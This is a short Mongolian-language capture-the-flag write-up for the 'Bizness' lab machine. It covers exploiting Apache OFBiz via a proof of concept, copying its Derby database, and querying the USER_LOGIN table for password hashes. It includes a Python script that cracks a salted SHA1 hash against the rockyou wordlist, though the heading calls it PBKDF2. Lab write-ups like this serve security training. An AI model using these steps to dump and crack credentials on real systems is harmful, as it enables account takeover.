# Bizness - Ofbiz + Derby DB / PBKDF2 Password Crack

Веб дээр accounting directory руу хандах үед Apache Ofbiz ажиллаж байна.

[image]

Сервис хувилбар дээр дараах эмзэг байдал үүссэн байна.

[image]

PoC-оор linux сервер лүү нэвтэрж орсон.

[image]

Ofbiz-ийн default database нь Derby юм. Тиймээс ofbiz-ийн ажиллаж буй /opt directory дотор derby directory байгаа эсэхийг шалгах юм.

[image]

```bash
find . -type d -name derby 2>/dev/null
```

[image]

Тус файлыг TAR өргөтгөлтэй болгоод attack машин руу дамжуулсан.

[image]

Дараах аргаар **connection** үүсгэлээ.

```bash
┌──(root㉿kali)-[/home/zetr0/machine/high/derby]
└─# ij
ij version 10.14
ij> protocol 'jdbc:derby';
ij> connect 'jdbc:derby:./ofbiz';
```

Ofbiz датабаазаас USER_LOGIN table-ийг уншиж байна.

[image]

```sql
select USER_LOGIN_ID, CURRENT_PASSWORD FROM ofbiz.USER_LOGIN;
```

[image]

## Apache Derby Cracker PBKDF2

```python
import hashlib
import base64
import os
from tqdm import tqdm

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):
        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

    def get_crypted_bytes(self, salt, value):
        try:
            hash_obj = hashlib.new(self.hash_type)
            hash_obj.update(salt.encode('utf-8'))
            hash_obj.update(value)
            hashed_bytes = hash_obj.digest()
            return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
        except hashlib.NoSuchAlgorithmException as e:
            raise Exception(f"Error while computing hash of type {self.hash_type}: {e}")

# Example usage:
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/share/wordlists/rockyou.txt'

encryptor = PasswordEncryptor(hash_type)

total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in tqdm(password_list, total=total_lines, desc="Processing"):
        value = password.strip()
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
            break
```
